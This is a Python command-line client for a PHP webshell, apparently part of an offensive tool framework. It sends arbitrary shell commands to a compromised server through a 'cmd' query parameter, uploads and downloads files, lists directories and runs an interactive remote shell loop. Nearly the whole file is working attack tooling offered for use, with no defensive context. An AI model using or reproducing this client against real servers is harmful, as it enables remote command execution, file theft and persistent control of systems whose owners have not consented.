#!/usr/bin/env python3
"""
PHP Webshell - Execute commands through web requests
"""

import os
import re
import sys
import requests
import json
from typing import Dict, List, Optional

def _project_root() -> str:
    """Get project root path"""
    return os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

def _registry_file() -> str:
    env_path = os.getenv("TOOLS_REGISTRY_YAML", "").strip()
    if env_path:
        return env_path
    root = _project_root()
    for candidate in (
        os.path.join(root, "docker", "tools_registry.yaml"),
        os.path.join(root, "tools_registry.yaml"),
    ):
        if os.path.exists(candidate):
            return candidate
    return os.path.join(root, "docker", "tools_registry.yaml")

def _load_tool_info(tool_name: str) -> Dict:
    """Load tool information from registry"""
    try:
        with open(_registry_file(), "r", encoding="utf-8") as f:
            import yaml
            data = yaml.safe_load(f)
            return data.get("tools", {}).get(tool_name, {})
    except Exception as e:
        print(f"Error loading tool info: {e}")
        return {}

def _build_cmd(commands: List[str], params: Dict) -> List[str]:
    """Build command with parameters"""
    merged_options = {}
    if params.get("options"):
        merged_options.update(params["options"])
    
    # Case-insensitive parameter mapping
    option_mappings = {
        "lhost": "LHOST",
        "lport": "LPORT", 
        "payload": "PAYLOAD",
        "cmd": "CMD",
        "command": "COMMAND",
        "targeturi": "TARGETURI",
        "file": "FILE",
        "action": "ACTION"
    }
    
    if merged_options:
        for key, value in merged_options.items():
            upper_key = key.upper()
            if upper_key in option_mappings.values():
                continue
            if key.lower() in option_mappings:
                upper_key = option_mappings[key.lower()]
            merged_options[upper_key] = value
    
    target = params.get("target", "")
    command = merged_options.get("COMMAND", "")
    file = merged_options.get("FILE", "")
    action = merged_options.get("ACTION", "exec")
    
    if not target:
        raise ValueError("Target URL is required")
    
    # Build webshell command based on action
    if action == "upload":
        if not file:
            raise ValueError("File path is required for upload action")
        cmd = f"python3 {__file__} upload --target {target} --file {file}"
    elif action == "download":
        if not file:
            raise ValueError("File path is required for download action")
        cmd = f"python3 {__file__} download --target {target} --file {file}"
    elif action == "list":
        cmd = f"python3 {__file__} list --target {target}"
    else:  # exec or empty action
        if command:
            cmd = f"python3 {__file__} exec --target {target} --command \"{command}\""
        else:
            cmd = f"python3 {__file__} interactive --target {target}"
    
    return [cmd]

def _parse_output(stdout: str, stderr: str) -> dict:
    """Parse execution output"""
    results = []
    sessions = []
    
    # Parse command output
    if stdout:
        lines = stdout.strip().split('\n')
        for line in lines:
            if line.strip():
                results.append({"line": line.strip()})
    
    # Parse stderr for errors
    if stderr:
        error_lines = stderr.strip().split('\n')
        for line in error_lines:
            if line.strip() and "error" in line.lower():
                results.append({"line": f"ERROR: {line.strip()}"})
    
    return {"results": results} if results else {"raw_preview": (stdout + stderr)[:2000]}

def main():
    """Main execution function"""
    try:
        import yaml
    except ImportError:
        print("Error: PyYAML is required for YAML parsing")
        sys.exit(1)
    
    if len(sys.argv) < 2:
        print("Usage: python3 execute.py <command> [options]")
        print("Commands:")
        print("  exec --target <url> --command <cmd>")
        print("  upload --target <url> --file <local_path>")
        print("  download --target <url> --file <remote_path>")
        print("  list --target <url>")
        print("  interactive --target <url>")
        sys.exit(1)
    
    command = sys.argv[1]
    
    if command == "exec":
        if len(sys.argv) < 5:
            print("Error: exec requires --target and --command")
            sys.exit(1)
        
        target = None
        cmd = None
        
        for i, arg in enumerate(sys.argv[2:], 2):
            if arg == "--target" and i + 1 < len(sys.argv):
                target = sys.argv[i + 1]
            elif arg == "--command" and i + 1 < len(sys.argv):
                cmd = sys.argv[i + 1]
        
        if not target or not cmd:
            print("Error: --target and --command are required")
            sys.exit(1)
        
        # Execute command via webshell
        try:
            response = requests.get(f"{target}?cmd={requests.utils.quote(cmd)}", timeout=30)
            
            if response.status_code == 200:
                # Try to extract command output from response
                # Common webshell output patterns
                patterns = [
                    r'<pre>(.*?)</pre>',
                    r'<textarea>(.*?)</textarea>',
                    r'Output:\s*(.*)',
                    r'Result:\s*(.*)'
                ]
                
                output = ""
                for pattern in patterns:
                    match = re.search(pattern, response.text, re.DOTALL | re.IGNORECASE)
                    if match:
                        output = match.group(1).strip()
                        break
                
                if not output:
                    output = response.text
                
                print(output)
            else:
                print(f"HTTP Error {response.status_code}: {response.text}")
                sys.exit(1)
                
        except Exception as e:
            print(f"Error executing command: {e}")
            sys.exit(1)
    
    elif command == "upload":
        if len(sys.argv) < 5:
            print("Error: upload requires --target and --file")
            sys.exit(1)
        
        target = None
        file_path = None
        
        for i, arg in enumerate(sys.argv[2:], 2):
            if arg == "--target" and i + 1 < len(sys.argv):
                target = sys.argv[i + 1]
            elif arg == "--file" and i + 1 < len(sys.argv):
                file_path = sys.argv[i + 1]
        
        if not target or not file_path:
            print("Error: --target and --file are required")
            sys.exit(1)
        
        # Read file and upload
        try:
            with open(file_path, 'rb') as f:
                files = {'file': f}
                data = {'upload': 'true'}
                response = requests.post(target, files=files, data=data, timeout=60)
                
                if response.status_code == 200:
                    print("File uploaded successfully")
                else:
                    print(f"Upload failed: {response.status_code} - {response.text}")
                    sys.exit(1)
                    
        except Exception as e:
            print(f"Error uploading file: {e}")
            sys.exit(1)
    
    elif command == "download":
        if len(sys.argv) < 5:
            print("Error: download requires --target and --file")
            sys.exit(1)
        
        target = None
        file_path = None
        
        for i, arg in enumerate(sys.argv[2:], 2):
            if arg == "--target" and i + 1 < len(sys.argv):
                target = sys.argv[i + 1]
            elif arg == "--file" and i + 1 < len(sys.argv):
                file_path = sys.argv[i + 1]
        
        if not target or not file_path:
            print("Error: --target and --file are required")
            sys.exit(1)
        
        # Download file
        try:
            response = requests.get(f"{target}?file={requests.utils.quote(file_path)}", timeout=30)
            
            if response.status_code == 200:
                with open(file_path, 'wb') as f:
                    f.write(response.content)
                print(f"File downloaded successfully to {file_path}")
            else:
                print(f"Download failed: {response.status_code} - {response.text}")
                sys.exit(1)
                
        except Exception as e:
            print(f"Error downloading file: {e}")
            sys.exit(1)
    
    elif command == "list":
        if len(sys.argv) < 3:
            print("Error: list requires --target")
            sys.exit(1)
        
        target = None
        
        for i, arg in enumerate(sys.argv[2:], 2):
            if arg == "--target" and i + 1 < len(sys.argv):
                target = sys.argv[i + 1]
        
        if not target:
            print("Error: --target is required")
            sys.exit(1)
        
        # List directory
        try:
            response = requests.get(f"{target}?cmd=ls -la", timeout=30)
            
            if response.status_code == 200:
                # Try to extract directory listing from response
                patterns = [
                    r'<pre>(.*?)</pre>',
                    r'<textarea>(.*?)</textarea>',
                    r'Output:\s*(.*)',
                    r'Result:\s*(.*)'
                ]
                
                output = ""
                for pattern in patterns:
                    match = re.search(pattern, response.text, re.DOTALL | re.IGNORECASE)
                    if match:
                        output = match.group(1).strip()
                        break
                
                if not output:
                    output = response.text
                
                print(output)
            else:
                print(f"List failed: {response.status_code} - {response.text}")
                sys.exit(1)
                
        except Exception as e:
            print(f"Error listing directory: {e}")
            sys.exit(1)
    
    elif command == "interactive":
        if len(sys.argv) < 3:
            print("Error: interactive requires --target")
            sys.exit(1)
        
        target = None
        
        for i, arg in enumerate(sys.argv[2:], 2):
            if arg == "--target" and i + 1 < len(sys.argv):
                target = sys.argv[i + 1]
        
        if not target:
            print("Error: --target is required")
            sys.exit(1)
        
        print(f"Interactive mode - Target: {target}")
        print("Type commands to execute (type 'exit' to quit):")
        
        while True:
            try:
                cmd = input(f"{target.split('/')[-1]}# ")
                if cmd.lower() in ['exit', 'quit']:
                    break
                
                response = requests.get(f"{target}?cmd={requests.utils.quote(cmd)}", timeout=30)
                
                if response.status_code == 200:
                    # Try to extract command output from response
                    patterns = [
                        r'<pre>(.*?)</pre>',
                        r'<textarea>(.*?)</textarea>',
                        r'Output:\s*(.*)',
                        r'Result:\s*(.*)'
                    ]
                    
                    output = ""
                    for pattern in patterns:
                        match = re.search(pattern, response.text, re.DOTALL | re.IGNORECASE)
                        if match:
                            output = match.group(1).strip()
                            break
                    
                    if not output:
                        output = response.text
                    
                    print(output)
                else:
                    print(f"Error: {response.status_code} - {response.text}")
                    
            except KeyboardInterrupt:
                print("\nExiting interactive mode...")
                break
            except Exception as e:
                print(f"Error: {e}")
    
    else:
        print(f"Unknown command: {command}")
        sys.exit(1)

if __name__ == "__main__":
    main()
